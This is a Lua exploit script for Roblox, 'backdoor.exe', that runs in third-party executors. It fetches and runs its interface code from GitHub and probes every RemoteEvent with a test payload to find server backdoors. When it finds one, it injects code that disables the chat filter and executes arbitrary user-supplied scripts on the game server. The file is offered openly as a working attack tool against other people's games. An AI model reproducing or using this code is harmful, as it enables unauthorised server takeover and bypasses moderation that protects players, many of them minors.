--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]


local localPlayer = game.Players.LocalPlayer
local UI_PARENT = game.CoreGui.RobloxGui
local SALT = "12623546126"
local INV_CODE = "6HndYgC"

local function notify(text,cb,b1,b2)
	game.StarterGui:SetCore(
		"SendNotification",{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text,
			Callback = cb,
			Button1 = b1,
			Button2 = b2
		}
	)
end

-- Removing dubs
for _, ui in pairs(UI_PARENT:GetChildren()) do
	if ui:IsA("ScreenGui") and string.match(ui.Name, SALT) then
		ui:Destroy()
	end
end

local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/ui.lua"))()
if syn then syn.protect_gui(UI) end
UI.Parent = UI_PARENT
UI.Name = SALT..tostring(math.random(100000000,1000000000))


local function findObject(name, type)
	 for i, object in pairs(UI:GetDescendants()) do
		if object.Name == name and object.ClassName == type then return object end
	 end
end

UI.Main.Active = true
UI.Main.Draggable = true

-- Top Bar
local closeButton = findObject("Close_Button","ImageButton")
local statusText = findObject("Status","TextLabel")
local statusColor = findObject("Status_Color","Frame")

-- Source Frame
local sourceFrame = findObject("sourceFrame","ScrollingFrame")
local source = findObject("source","TextBox")
local lines = findObject("lines","TextLabel")

-- Source Buttons
local sourceButtons = findObject("Main_Buttons","Frame")
--- Left
local executeButton = findObject("Execute_Button","TextButton")
local clearButton = findObject("Clear_Button","TextButton")
local hideButton = findObject("Hide_Button","TextButton")
--- Right
local scanButton = findObject("Scan_Button","TextButton")
local inviteButton = findObject("Invite_Button","TextButton")


local BackdoorUI = {
	attached = false,
	backdoorRemote = nil,
	scanning = false
}

local function changeUiState()

	local attachColors = {
		["true"] = Color3.fromRGB(95, 185, 47),
		["false"] = Color3.fromRGB(185, 48, 48)
	}
	local attachTexts = {
		["true"] = "Attached",
		["false"] = "Unattached"
	}

	BackdoorUI.attached = not BackdoorUI.attached
	statusColor.BackgroundColor3 = attachColors[tostring(BackdoorUI.attached)]
	statusText.Text = attachTexts[tostring(BackdoorUI.attached)]

	if BackdoorUI.attached then
		notify("Backdoor Found")
	end
end
local function stringToInstance(str)
	 -- Credits to the DevForum
	local dir = str
	local segments = dir:split(".")
	local current = game
	for i, v in pairs(segments) do
		 current = current[v]
	end
	return current
end
local function check(vn)
	
	if workspace:FindFirstChild(vn) then
		BackdoorUI.backdoorRemote = stringToInstance(workspace:FindFirstChild(vn).Value)
		
		-- Anti-Censoring
		BackdoorUI.backdoorRemote:FireServer("local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
		notify("Anti-Censoring is ACTIVE")
		
		workspace:FindFirstChild(vn):Destroy()
		return true
	end
end

local function remoteCheck(rm)
	local fullName =  rm:GetFullName()

	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, localPlayer.Name) then return false end
	if rm:FindFirstChild("__FUNCTION") then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end
	return true
	
end

local function scan()
	if BackdoorUI.scanning then return end
	if BackdoorUI.attached then changeUiState() end

	BackdoorUI.scanning = true
	statusText.Text = "Scanning"
	local valueName = SALT..math.random(100000, 999999)

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then
			local testScript = "i=Instance.new('StringValue',workspace) i.Name='"..
								valueName.."' i.Value='"..testRemote:GetFullName().."'"

			if remoteCheck(testRemote) then
				testRemote:FireServer(testScript)
			end

			if check(valueName) then
				changeUiState()
				return
			end
			game:GetService("RunService").Stepped:Wait()
		end
	end

	 -- Wait for possible server lag
	statusText.Text = "Rechecking"
	wait(1.5)
	if check(valueName) then
		changeUiState()
		return
	end
	
	BackdoorUI.scanning = false
	notify("Failed to find a backdoor")
	statusText.Text = "Failed"
end

local function executeScript()
	local function callback(text)
		if text == "Yes" then
			scan()
			BackdoorUI.backdoorRemote:FireServer(source.Text)
		elseif text == "No" then
			return
		end
	end

	local bf = Instance.new("BindableFunction"); bf.OnInvoke = callback

	if not BackdoorUI.attached then
		notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
	else
		BackdoorUI.backdoorRemote:FireServer(source.Text)
	end
end

local function promtDicordInvite(invCode)

	setclipboard(invCode)

    local httpService = game:GetService("HttpService")
    local httpRequest = (syn and syn.request) or (httpService and httpService.request) or http_request

    if not httpRequest then notify("Invite code copied!") return end
    
    local request = httpRequest({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",

        Headers = {
            ['Content-Type'] = 'application/json',
            Origin = 'https://discord.com'
        },

        Body = httpService:JSONEncode({
            args = {code = invCode},
            cmd = 'INVITE_BROWSER',
            nonce = httpService:GenerateGUID(false)
        })
    })
	if request.StatusCode ~= 200 then notify("Invite code copied!") return end
	notify("You have been promted to join our Discord. Open your Discord.")
end

-- Buttons
closeButton.MouseButton1Click:Connect(function() UI:Destroy() end)
scanButton.MouseButton1Click:Connect(scan)
executeButton.MouseButton1Click:Connect(executeScript)
clearButton.MouseButton1Click:Connect(function() source.Text = ""  end)
hideButton.MouseButton1Click:Connect(function() sourceFrame.Visible = not sourceFrame.Visible end)
inviteButton.MouseButton1Click:Connect(function() promtDicordInvite(INV_CODE) end)
notify("Make sure to join our Discord!\nCode: "..INV_CODE)

--	k4scripts
--	.------.
--	|4.--. |
--	| :/\: |
--	| :\/: |
--	| '--'4|
--	`------'
